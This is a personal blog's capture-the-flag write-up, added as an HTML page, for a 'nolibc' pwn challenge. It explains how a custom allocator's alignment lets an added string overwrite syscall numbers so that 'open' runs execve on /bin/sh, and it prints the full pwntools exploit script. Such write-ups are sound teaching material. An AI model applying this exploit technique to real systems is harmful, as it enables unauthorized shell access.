@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title> | papichulo16</title>
+  <link rel="stylesheet" href="/assets/css/style.css">
+  
+</head>
+<body>
+  <nav class="navbar">
+    <a class="menu home-link" href="/"><img src="/assets/img/chavo.png" alt="El chavo" class="pfp-img">papichulo16</a>
+
+    <div class="nav-right">
+      <a href="https://github.com/papichulo16">Github</a>
+      <a href="/contact">Contact</a>
+      <a href="/reviews">Reviews</a>
+      <div class="dropdown">
+        <span><a href="/projects">Projects ▾</a></span>
+        <div class="dropdown-content">
+          
+            <a href="/projects/1_magical_kernel.html">Magical Kernel</a>
+          
+            <a href="/projects/2_crap.html">C.R.A.P</a>
+          
+            <a href="/projects/6_ctf_writeups.html">PWN Writeups</a>
+          
+        </div>
+      </div>
+    </div>
+  </nav>
+  <hr>
+
+  <main>
+    <article class="post">
+
+  <header class="post-header">
+    <h1 class="post-title"></h1>
+  </header>
+
+  <div class="post-content">
+    <p>Alright so I was told to start doing writeups so here we go. Also this challenge wasn’t solved until a day after the CTF was over but at least I learned a bit.</p>
+
+<p>When running the challenge you are promped with a login screen (that is unimportant for the solution) and then a couple options.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Add string
+2. Delete string
+3. View strings
+4. Save to File
+5. Load from File
+6. Logout
+Choose an option: 
+</code></pre></div></div>
+
+<p>The two important options for this solution are <code class="language-plaintext highlighter-rouge">add string</code> and <code class="language-plaintext highlighter-rouge">load from file</code>. So the basic premise of this challenge is that it is using a fake <code class="language-plaintext highlighter-rouge">malloc</code> (along with a few other functions) that is manually created using an array and a fake top chunk variable. Add string will call said <code class="language-plaintext highlighter-rouge">malloc</code> function.</p>
+
+<p>Then what my <a href="https://github.com/SolarDebris">friend</a> found out is that the <code class="language-plaintext highlighter-rouge">syscalls</code> that were used are stored in writeable memory and are placed right after the big buffer that is supposed to represent the fake heap.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                             READ                                             
+                                                                                           
+                                                                                           
+        00115000 00 00 00 00     undefined4 00000000h
+                             WRITE                                            
+                                                                                           
+                                                                                            
+        00115004 01 00 00 00     undefined4 00000001h
+                             OPEN                                             
+                                                                                           
+        00115008 02 00 00 00     undefined4 00000002h
+</code></pre></div></div>
+
+<p>So now that we had an attack vector we were trying to find out how to overwrite those variables. What I realized was that the <code class="language-plaintext highlighter-rouge">read</code> function (that is also manually created) was reading an extra byte and would overflow into the <code class="language-plaintext highlighter-rouge">read</code> syscall.</p>
+
+<p>Now the only problem was that it was not the <code class="language-plaintext highlighter-rouge">read</code> that we had to make work but the <code class="language-plaintext highlighter-rouge">open</code>. This led us into a pretty deep rabbit hole of us trying different syscalls trying to get creative for the rest of the night.</p>
+
+<p>Once the CTF was over we realized that when <code class="language-plaintext highlighter-rouge">malloc()</code> was called in the <code class="language-plaintext highlighter-rouge">add_string</code> function it actually was calling <code class="language-plaintext highlighter-rouge">malloc(size + 1)</code> and since inside malloc there was a line that would take the size and align it to the nearest 16th byte, when we were calling that final <code class="language-plaintext highlighter-rouge">add_string</code> we were actually already kind of allocating over those syscalls, but we didn’t realize it. So when we did realize it we were able to change the <code class="language-plaintext highlighter-rouge">open</code> syscall to <code class="language-plaintext highlighter-rouge">execve</code> and then call <code class="language-plaintext highlighter-rouge">open from file</code> with <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">170</span><span class="p">):</span>
+	<span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"[*] Sending string "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+	<span class="n">add_string</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>
+
+<span class="c1"># fill up the large buffer, then overwrite the "open" syscall with "execve"
+# SYS_READ, SYS_WRITE, SYS_EXECVE, SYS_EXIT
+</span><span class="n">add_string</span><span class="p">(</span><span class="mh">0x3f</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">48</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x3c</span><span class="p">))</span>
+
+<span class="n">read_from_file</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now the last problem we encountered was that the <code class="language-plaintext highlighter-rouge">read from file</code> function would check the fake top chunk to see if there was any space left over and since there wasn’t this wasn’t going to work. Luckily all we had to do was just free a little bit more space and it worked.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># load_file checks if the top chunk has space, so you must free something for the top chunk to exist again
+</span><span class="n">delete_string</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>This is the whole solution script.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">gs</span> <span class="o">=</span> <span class="s">'''
+
+	continue
+
+'''</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+		<span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"./nolibc"</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
+
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s">"./nolibc"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">read_from_file</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'filename: '</span><span class="p">,</span> <span class="nb">file</span><span class="p">)</span>
+
+    <span class="c1">#io.recvuntil(b":")
+</span>
+<span class="k">def</span> <span class="nf">add_string</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+	<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+
+	<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"length:"</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>
+	<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"string:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+	<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete_string</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+	<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+
+	<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"delete:"</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>
+	<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">beginning</span><span class="p">(</span><span class="n">opt</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">):</span>
+	<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">opt</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>
+
+	<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Username:"</span><span class="p">,</span> <span class="n">user</span><span class="p">)</span>
+	<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Password:"</span><span class="p">,</span> <span class="n">pw</span><span class="p">)</span>
+
+	<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="c1"># ======================================================
+</span>
+<span class="n">beginning</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="p">)</span>
+<span class="n">beginning</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"a"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">170</span><span class="p">):</span>
+	<span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"[*] Sending string "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+	<span class="n">add_string</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>
+
+<span class="c1"># fill up the large buffer, then overwrite the "open" syscall with "execve"
+# SYS_READ, SYS_WRITE, SYS_EXECVE, SYS_EXIT
+</span><span class="n">add_string</span><span class="p">(</span><span class="mh">0x3f</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">48</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x3c</span><span class="p">))</span>
+
+<span class="c1"># load_file checks if the top chunk has space, so you must free something for the top chunk to exist again
+</span><span class="n">delete_string</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">read_from_file</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">)</span>
+
+<span class="c1"># =====================================================
+</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Didn’t get it, but definitely learned a lot. Things like how arrays are kept in memory is one area for idx pointers
+and one for the data. Also things like getting better at reversing with ghidra and the <code class="language-plaintext highlighter-rouge">piebase</code> cmd
+in GDB. Also don’t forget that in ghidra, you have to check the assembly after you see <code class="language-plaintext highlighter-rouge">syscall()</code>.</p>
+
+<p>Also the biggie, there can be constant variables in writeable memory and if so, then there is an 
+attack vector. Like in this challenge, the read, write, open, and close syscalls are stored in
+writeable memory. And that is what we exploited.</p>
+
+<p>Very unique and cool challenge. Very tough with a lot of reverse engineering though.</p>
+
+  </div>
+
+</article>
+
+  </main>
+
+  <footer>
+    <hr>
+    © 2025 papichulo16
+  </footer>
+</body>
+</html>
+
